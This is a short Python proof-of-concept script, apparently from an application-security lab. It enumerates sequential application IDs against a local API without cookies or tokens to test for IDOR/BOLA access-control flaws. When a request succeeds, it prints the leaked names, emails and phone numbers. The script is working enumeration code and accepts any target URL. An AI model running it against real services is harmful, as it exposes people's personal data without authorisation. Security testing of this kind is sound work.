#!/usr/bin/env python3
"""
IDOR / BOLA Parameter Enumeration & Reconnaissance PoC
Automated fuzzing script testing for unauthenticated object leaks.
Author: Jeeviraj V (AppSec & API Pentesting)
"""

import json
import sys
import time
import urllib.request
import urllib.error

TARGET_BASE = "http://localhost:5000"
ENDPOINT_TEMPLATE = "/api/v1/applications/{app_id}"

# Fuzzing list of sequential candidate IDs
SAMPLE_IDS = [
    "DT-2026-001",
    "DT-2026-002",
    "DT-2026-003",
    "DT-2026-004",
    "DT-2026-005",
    "DT-2026-999"  # Non-existent ID boundary test
]


def test_idor_vulnerability(base_url: str):
    print("=" * 72)
    print("   DATHEON APPSEC LAB: UNETHICAL IDOR / BOLA FUZZING AUDIT")
    print("=" * 72)
    print(f"Target: {base_url}")
    print("Testing unauthenticated access (Zero Cookies, Zero Bearer Tokens)...\n")

    leaked_count = 0

    for candidate_id in SAMPLE_IDS:
        target_url = f"{base_url}{ENDPOINT_TEMPLATE.format(app_id=candidate_id)}"
        req = urllib.request.Request(
            target_url,
            headers={
                "User-Agent": "AppSec-Security-Audit/1.0",
                "Accept": "application/json"
            }
        )

        try:
            start = time.time()
            with urllib.request.urlopen(req, timeout=3) as resp:
                elapsed_ms = round((time.time() - start) * 1000, 1)
                status = resp.status
                payload = json.loads(resp.read().decode("utf-8"))

                print(f"[!] VULNERABLE [HTTP {status}] ({elapsed_ms}ms) -> Target: {candidate_id}")
                print(f"    Leaked PII: Name='{payload.get('candidateName')}', Email='{payload.get('email')}', Phone='{payload.get('phone')}'")
                leaked_count += 1

        except urllib.error.HTTPError as e:
            elapsed_ms = round((time.time() - start) * 1000, 1)
            if e.code in (401, 403):
                print(f"[+] PROTECTED [HTTP {e.code}] ({elapsed_ms}ms) -> Target: {candidate_id} (Access Denied)")
            elif e.code == 404:
                print(f"[-] NOT FOUND [HTTP 404] ({elapsed_ms}ms) -> Target: {candidate_id}")
            else:
                print(f"[?] ERROR [HTTP {e.code}] ({elapsed_ms}ms) -> Target: {candidate_id}")

        except urllib.error.URLError as e:
            print(f"[x] Connection failed: {e.reason}")
            print("\nPlease ensure the AppSec lab server is running via:")
            print("  node server.js\n")
            sys.exit(1)

    print("\n" + "-" * 72)
    print(f"Fuzzing Summary: Tested {len(SAMPLE_IDS)} targets | Leaked Records: {leaked_count}")
    if leaked_count > 0:
        print("CRITICAL FINDING: Unauthenticated IDOR detected! Direct Object references expose PII.")
    else:
        print("VERIFIED SECURE: Authorization guards blocked unauthenticated requests.")
    print("-" * 72)


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_BASE
    test_idor_vulnerability(url)
